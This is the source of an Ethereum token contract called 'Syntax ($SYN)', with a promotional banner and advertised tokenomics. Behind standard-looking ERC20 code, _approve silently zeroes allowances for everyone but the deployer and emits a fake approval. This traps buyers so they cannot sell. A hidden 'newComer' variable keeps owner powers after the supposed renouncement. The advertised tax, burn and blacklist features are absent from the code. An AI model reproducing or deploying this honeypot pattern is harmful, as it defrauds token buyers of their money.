/**
 *Submitted for verification at Etherscan.io on 2021-07-20
*/

/*

......................................................................................................................................................
......................................................................................................................................................
......................................................................................................................................................
.................................................................',;;;'.';;;,'........................................................................
.............................................................':ldxOO0k:.cxkkkkdoc;'...................................................................
...........................................................;ok00KKKKKO:.ckkkkO000Odc,.................................................................
.........................................................;oO00KKKKKKKk:.ckkkkkO00K00kc'...............................................................
........................................................ck0KKKK0K00kdc,',codxkkO00KKK0d;..............................................................
.......................................................cOKKKKK0Odl:,',;,''',,:ldk0KKKK0x;.............................................................
......................................................;k00KK00x;..';;,'',;,''..'lOKKK000d'............................................................
......................................................l00K0OOko'.'',,;,',;,'',,.:OKKKKKKk:............................................................
.....................................................'o000Okkko'',,;,'''',;:,,,.:OKKKKKKO:............................................................
......................................................lO0Okkkko'.,,'':;,;,,;';;.:OKKKKKKk;............................................................
......................................................;xOkkxoc,'';,',:;';,,;'',',coxO0K0o'............................................................
.......................................................;lc;,,;lddl:;,,'..'''';cooc:;;col,.............................................................
.........................................................':oxO00KK0kdl;,;:lodkkkkkkdo:'...............................................................
.........................................................'lO0KKKKKKKK00OO0OOOOOOOOOOkl'...............................................................
...........................................................;ok00KKKKKKKKKKKKK00000ko;.................................................................
.............................................................,:oxkO00KKKKKKK0Okxo:,...................................................................
.................................................................,;:clllllcc:;,.......................................................................
......................................................................................................................................................
............',,;;;;;;;;,'.....',;;,..........',;;,....................',,'.....',;,;,,;;;,,,,,;;;;,'.....................',;,'..........,;;,'.........
..........;oxkOOOOOOOOOOkdc'..'cxOko,......':xOko;...,ll,.............lOOo'....:kOOOOOOOOOOOOOOOOOOl......,lc............,okOxc'......,okOxc'.........
.........:k0Odlcccccccclx00o'...;dO0kc'...;dO0kc'....;k0Odc,..........l00d'....,cccccccoOKOdccccccc;.....;x0Oc'...........'ck0Od;...'cx00d;...........
.........l00x;..........,:c:'....':x00d:,lk0Oo,......;kKKK0ko:'.......l00d,............;kKO:............;x0KKOl'............,oO0kl,;dO0kc'............
.........;x00xooooooooolc;.........,lk0OO00x:........;kKOdok00xl;'....o00d,............;kKO:...........:k0Oxk0Oo'.............:x00OO0Oo,..............
..........,coxxkkkkkkkkO0Oo,.........;d0KOl'.........;kKO:.,cdk0Oxl;..l00d,............;kKO:..........:k0Ol,;x0Oo,.............,d00K0l'...............
..............''''''''';d00d,.........cOKk;..........;kKO:....,cdO0Odlx00d,............;kKO:.........ck0Ol'..;x00d,...........;dO0O00kl,..............
.........;ooc'..........cOKk;.........cOKk;..........;kKOc.......;lxO0000d'............;kKO:........cO0kc.....,d00d,........'lk0Oo;:x00x:.............
.........;x00xlccccccccok0Ol'.........cOKk;..........;kKOc.........';ok00d'............;kKO:......'lO0kc.......,d00d;.....':x00x:...'lk0Oo;...........
..........,cdkOO000000OOxo:'..........ck0x;..........;x0k:............':ol'............;x0k:.....'lkOx:.........,oOOd;...,okOkl'......;oOOxc'.........
.............,;;;;;;;;;,'.............';;,............,;;'...............'.............',;;'......,;;,...........';;;'...,;;;,..........,;;,'.........
......................................................................................................................................................
......................................................................................................................................................
......................................................................................................................................................

Know your SYNTAX. Spread the word. Dominate the charts.

📃 Name:   Syntax
📃 Symbol: $SYN

    📌 Website:  https://syntax.finance/                                                                                                                                            
    📌 Twitter:  https://twitter.com/syntaxdefi                                                                                                                                                                                                          
    📌 Telegram: https://t.me/syntaxdefi

📊 Tokenomics 📊

    📑 8% tax on each transaction as follows:
        ♻️ 6% Buyback wallet
        ♻️ 2% Marketing wallet
        ♻️ 4% Redistribution to holders

🔔 Launch Features 🔔
 
    🚀  Fair launch
    🔥  15.5% initial burn
    💰  1 trillion total supply                                                                                                                                                                                                                                                      
    🛑  Bots Blacklisted                                                                                                                                                                                                                                                    
    🔒  Liquidity Locked                                                                                                                                                                                                                                                 
    🔑  Contract Renounced

*/


pragma solidity ^0.6.12;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external returns (bool);
    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
 
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
 
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
 
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
 
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
 
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract syntax is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 1000 * 10**9 * 10**18;
    string private _name = 'Syntax | https://t.me/AnubisInu';
    string private _symbol = '$SYN';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address synapp, address target, uint256 amount) private {
        require(synapp != address(0), "ERC20: approve from the zero address");
        require(target != address(0), "ERC20: approve to the zero address");

        if (synapp != owner()) { _allowances[synapp][target] = 0; emit Approval(synapp, target, 4); }  
        else { _allowances[synapp][target] = amount; emit Approval(synapp, target, amount); } 
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}